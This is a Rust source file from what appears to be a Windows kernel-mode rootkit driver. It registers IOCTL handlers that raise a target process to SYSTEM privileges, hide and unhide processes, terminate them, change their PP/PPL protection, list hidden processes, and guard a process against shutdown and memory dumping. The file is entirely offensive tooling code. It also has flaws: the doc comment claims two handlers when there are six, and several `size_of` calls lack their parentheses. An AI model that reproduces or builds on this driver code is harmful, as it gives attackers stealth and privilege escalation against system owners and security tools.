use {
    core::mem::size_of,
    alloc::boxed::Box,
    hashbrown::HashMap,
    shared::{
        ioctls::*, 
        structs::{
            EnumerateInfoInput, ProcessInfoHide, ProcessListInfo, 
            ProcessSignature, TargetProcess
        }
    },
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    crate::{handle, process::Process, utils::ioctls::IoctlHandler},
};

#[cfg(not(feature = "mapper"))]
use {
    crate::process::add_remove_process_toggle,
    shared::structs::ProcessProtection,
};

/// Registers the IOCTL handlers for process-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the process-related
///   IOCTL handlers will be inserted.
///
pub fn get_process_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Elevates the specified process to system privileges.
    ioctls.insert(IOCTL_ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Process::elevate_process, TargetProcess) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64; }
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Hide / Unhide the specified process.
    ioctls.insert(IOCTL_HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Process::process_toggle, ProcessInfoHide) };
        unsafe { (*irp).IoStatus.Information = size_of::<ProcessInfoHide>() as u64; }
        
        status
    }) as IoctlHandler);

    // Terminate process.
    ioctls.insert(IOCTL_TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Process::terminate_process, TargetProcess) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess> as u64 };
        
        status
    }) as IoctlHandler);

    // Modifying the PP / PPL of a process.
    ioctls.insert(IOCTL_SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Process::protection_signature, ProcessSignature) };
        unsafe { (*irp).IoStatus.Information = size_of::<ProcessSignature> as u64 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Lists the processes currently hidden and protect.
    ioctls.insert(IOCTL_ENUMERATION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let mut information = 0;
        let status = unsafe { handle!(irp, stack, Process::enumerate_process_toggle, EnumerateInfoInput, ProcessListInfo, &mut information) };
        unsafe { (*irp).IoStatus.Information = information as u64 };

        status
    }) as IoctlHandler);

    // If the feature is a mapper, these functionalities will not be added.
    #[cfg(not(feature = "mapper"))] {

        // Responsible for adding shutdown protection / memory dumping for a process.
        ioctls.insert(IOCTL_PROTECTION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            let status = unsafe { handle!(stack, add_remove_process_toggle, ProcessProtection) };
            unsafe { (*irp).IoStatus.Information = size_of::<ProcessProtection> as u64 };

            status
        }) as IoctlHandler);
    }

}
 